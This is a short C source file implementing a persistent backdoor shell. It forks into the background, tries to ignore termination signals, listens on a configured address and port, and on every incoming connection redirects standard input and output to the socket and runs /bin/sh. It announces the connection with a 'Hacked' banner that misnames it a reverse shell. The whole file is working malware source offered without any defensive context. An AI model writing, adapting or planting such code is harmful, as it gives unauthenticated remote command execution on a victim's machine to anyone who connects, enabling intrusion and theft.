
#include <stdlib.h>
#include <unistd.h>
#include <cstring>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
void handleall(int sig){
   return;
}

struct sockaddr_in attacker={.sin_family=AF_INET,.sin_port=htons(PORT)}, tmp;
int b, l, a;

char* GetHostByName(const char* dns){
   struct hostent* host=gethostbyname(dns);
   char *ipaddr=(char*)malloc(16);

   if (host==0x00)return 0x00;

   inet_ntop(AF_INET, host->h_addr, ipaddr, 16);

   return ipaddr;
}

int main(void){
  signal(SIGPIPE, handleall);
  signal(SIGINT , handleall);
  signal(SIGTERM, handleall);
  signal(SIGTRAP, handleall);
  signal(SIGHUP , handleall);
  signal(SIGSTOP, handleall);
  signal(SIGKILL, handleall);
  signal(SIGQUIT, handleall);

  if (fork()>0)exit(0);

  char *ip=GetHostByName(IP);
  inet_pton(AF_INET,ip,&attacker.sin_addr.s_addr);
  int t;

  int s=socket(AF_INET, SOCK_STREAM,0);
  t=setsockopt(s, SOL_SOCKET, SO_REUSEADDR,&t, sizeof(int));
  b=bind(s,(struct sockaddr*)&attacker,sizeof(attacker));
  l=listen(s, 1);
  socklen_t atl=sizeof(tmp);

code:
  a=accept(s,(struct sockaddr*)&tmp,&atl);
  for (int fd=0;fd<3;fd++) { close(fd); dup2(a,fd);}
  send(a,"☢ Hacked !!Reverse Live Shell Opened !!\n", sizeof("☢ Hacked !!Reverse Live Shell Opened !!\n"),0);
  system("/bin/sh");
  close(a);
  goto code;
}

